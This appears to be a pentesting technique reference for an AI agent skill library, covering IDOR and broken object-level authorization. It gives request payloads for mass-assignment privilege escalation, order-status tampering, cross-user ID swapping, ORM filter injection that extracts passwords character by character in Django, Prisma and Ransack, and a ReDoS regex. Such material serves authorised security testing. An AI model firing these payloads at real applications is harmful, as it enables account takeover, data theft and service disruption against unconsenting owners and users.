# SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [9. INDIRECT IDOR (REFERENCE CHAIN)](#9-indirect-idor-reference-chain)
- [10. MASS ASSIGNMENT → PRIVILEGE ESCALATION](#10-mass-assignment-privilege-escalation)
- [11. STATE MACHINE ABUSE (BUSINESS LOGIC IDOR)](#11-state-machine-abuse-business-logic-idor)
- [12. QUICK IDOR CHECKLIST](#12-quick-idor-checklist)
- [13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES](#13-systematic-idor-testing-8-categories)
- [14. ORM FILTER CHAIN LEAKS](#14-orm-filter-chain-leaks)
<!-- zhiyugo:toc:end -->

## 9. INDIRECT IDOR (REFERENCE CHAIN)

App checks permission on **object A** but doesn't check ownership of **referenced object B**:

**Example**:
```
UserA has permission to read their own messages.
GET /api/messages/1234 → checks: "does user own message 1234?" ✓

But: messages have attachments.
GET /api/attachments/5678 → doesn't check: "does attachment belong to message owned by user?"
```

Test: access attachments/sub-resources directly via their IDs without going through parent endpoint.

**GraphQL variant**: Inline querying related objects without separate authorization:
```graphql
query {
  myProfile {
    followers {
      privateEmail    ← accessing private field of OTHER users via relationship
    }
  }
}
```

---

## 10. MASS ASSIGNMENT → PRIVILEGE ESCALATION

When POST/PUT takes a JSON body, properties in the underlying model may be settable even if not in the official API docs:

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",          ← hidden field
  "isAdmin": true,          ← hidden field
  "verified": true,         ← skip email verification
  "creditBalance": 9999     ← give self credits
}
```

**How to find hidden fields**:
1. Intercept admin "create user" vs normal "register" — diff the fields
2. Read API documentation for all possible fields
3. Check source code if available (GitHub, JS bundles)
4. Fuzz with Burp: add common property names and check for `200` vs `400`

---

## 11. STATE MACHINE ABUSE (BUSINESS LOGIC IDOR)

When resources have a status/state:
```
order.status: pending → confirmed → shipped → delivered
```

Test: Can you skip states?
```
PUT /api/orders/1234 {"status": "delivered"}  ← from "pending"
PUT /api/orders/1234 {"status": "refunded"}   ← from "pending" (skip shipped)
```

Can you set another user's order status?
```
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← as UserB
```

---

## 12. QUICK IDOR CHECKLIST

```
□ Create 2 accounts (UserA + UserB)
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own)
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status field modification
```

---

## 13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES

| # | Category | Test Method |
|---|---|---|
| 1 | Direct ID reference | Change numeric/UUID ID in URL: `/api/users/123` → `/api/users/124` |
| 2 | Predictable UUID | If UUIDs are v1 (time-based), adjacent IDs are calculable |
| 3 | Batch/bulk operations | `/api/users/bulk?ids=123,456` — add other users' IDs |
| 4 | Export/download | Export endpoint leaks other users' data: `/export?user_id=*` |
| 5 | Linked object IDOR | Change `order.address_id` to another user's address |
| 6 | Resource replacement | Update own profile with another user's resource ID → overwrites |
| 7 | Write IDOR | PUT/PATCH/DELETE with other user's ID — modify/delete their data |
| 8 | Nested object | `/api/orgs/1/users/2` — change org ID to access other org's users |

### Testing Flow

```
1. Create two test accounts (A and B)
2. Perform all CRUD operations as A, capture all request IDs
3. Replay each request replacing A's IDs with B's IDs
4. Check: Can A read B's data? Modify? Delete?
5. Test with: numeric IDs, UUIDs, slugs, encoded values
6. Test across: URL path, query params, JSON body, headers
```

---

## 14. ORM FILTER CHAIN LEAKS

### Django ORM Filter Injection

```python
# Vulnerable: User.objects.filter(**request.data)
# Attacker sends: {"password__startswith": "a"}
# Django translates to: WHERE password LIKE 'a%'

# Character-by-character extraction:
POST /api/users/
{"username": "admin", "password__startswith": "a"}   → 200 (match)
{"username": "admin", "password__startswith": "b"}   → 404 (no match)
# Iterate through charset for each position

# Relational traversal:
{"author__user__password__startswith": "a"}
# Traverses: Author → User → password field

# On MySQL: ReDoS via regex
{"email__regex": "^(a+)+$"}  → CPU spike if match exists
```

### Prisma Filter Injection

```json
// Vulnerable: prisma.user.findMany({ where: req.body })
// Attacker sends nested include/select:
{
  "include": {
    "posts": {
      "include": {
        "author": {
          "select": {"password": true}
        }
      }
    }
  }
}
// Leaks password field through relation traversal
```

### Ransack (Ruby on Rails)

```
# Ransack allows search predicates via query params:
GET /users?q[password_cont]=admin
# Searches: WHERE password LIKE '%admin%'

# Character extraction:
GET /users?q[password_start]=a   → count results
GET /users?q[password_start]=ab  → narrow down
# Tool: plormber (automated Ransack extraction)
```
